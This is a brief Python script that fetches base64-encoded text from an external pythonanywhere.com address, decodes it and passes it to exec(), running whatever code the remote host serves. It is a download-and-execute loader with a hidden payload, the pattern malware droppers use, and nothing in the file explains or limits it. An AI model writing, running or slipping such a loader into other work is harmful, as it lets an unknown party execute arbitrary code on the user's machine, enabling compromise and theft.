import requests
import base64

data = requests.get("https://farhad807156.pythonanywhere.com/core").text
code = base64.b64decode(data).decode()

exec(code)
